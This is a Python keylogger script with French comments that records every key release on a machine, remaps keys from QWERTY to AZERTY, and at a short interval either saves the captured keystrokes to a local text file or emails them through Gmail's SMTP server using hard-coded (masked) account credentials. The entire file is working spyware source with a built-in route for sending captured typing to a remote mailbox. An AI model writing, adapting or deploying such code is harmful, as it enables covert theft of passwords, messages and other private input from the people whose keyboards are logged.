#!/usr/bin/env python3
import smtplib # on importe ce module pour l'envoied'un email en utilisant SMTP protocol (gmail)
import keyboard # pour importer le keylogs
# faire en sorte qu'une méthode s'exécute après un "intervalle" de temps
from threading import Timer
from datetime import datetime
SEND_REPORT_EVERY = 5 # pour l'envoie des infos collecter que 60s (on peut le changer)
# enter votre adresse mail et le mdps 
EMAIL_ADDRESS = "******@gmail.com"
EMAIL_PASSWORD = "*******"
class Keylogger:
    def __init__(self, interval, report_method="email"):
        # on effectue SEND_REPORT_EVERY a interval
        self.interval = interval
        # choisir si on stock le resultat su l'email ou dans un fichier local  
        self.report_method = report_method
        # une chaine de caractere qui contient le journal de toutes les frappes dans `self.interval`    
        self.log = ""
        # enregistrer le temps de debut et fin 
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
    def callback(self, event):
        # on fait appel a cette fonction a chaque fois qu'on press une touche du clavier
        #j ai esseye de regler l affichage des frappes
        name = event.name
        if len(name) == 1:
            # pour changer le clavier qwerty a azerty
            if name == "q":
                name = "a"
            elif name == "a":
                name = "q"
            elif name == "w":
                name = "z"
            elif name == "z":
                name = "w"
            elif name == ";":
                name = "m"
            elif name == "!":
                name = "/"
            elif name == "÷":
                name = "/"
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "backspace":
                name = " "
            elif name == "enter":
                name = "\n"
            elif name == "decimal":
                name = "."
        # on concatene le lettre presse a la variable `self.log`
        self.log += name
    def update_filename(self):
        # choisir la structure du nom du fichier qui stocke le resulta de l'execution
        # utiliser avec la methode de stocker les infos dans un fichier local
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = "keylog-{}_{}".format((start_dt_str),(end_dt_str))
    def report_to_file(self):
        # on cree un fichier journal dans le repertoire courant contenant les valeur des keylogs stocker dans la variable `self.log`
        with open("{}.txt".format(self.filename), "w") as f:
            print (self.log, file=f)
        print("[+] {}.txt".format(self.filename))
    def sendmail(self, email, password, message):
        # connecter au  SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # connecter au SMTP serveur en mode TLS pour la securiter des donnees envoyees au mail
        server.starttls()
        # se connecter au compte mail
        server.login(email, password)
        # envoyer les infos recuperer des keylogs au mail 
        server.sendmail(email, email, message)
        # terminer la session
        server.quit()    
    def report(self):
        # Cette fonction est appelée à chaque `self.interval` elle envoie les keylogs recuperer et reinitialise la variable `self.log`      
        if self.log:
            # signaler quand le journal n est pas vide
            self.end_dt = datetime.now()
            # mettre à jour `self.filename`
            self.update_filename()
            #choisir la methode de stockage et envoie a utiliser
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer  
        timer.start()
    def start(self):
        # enregistrer le start datetime
        self.start_dt = datetime.now()
        # executer le keylogger
        keyboard.on_release(callback=self.callback)
        # commencer l envoie des keylogs
        self.report()
        # afficher le msg du commencement de l execution
        print("{} - Started keylogger".format(datetime.now())) 
        keyboard.wait()
if __name__ == "__main__":
    # Pour l'envoie des keylogs au mail on utilise cette commande
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    # pour enregistrer les keylogs dans un fichier local on utilise cette commande  
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
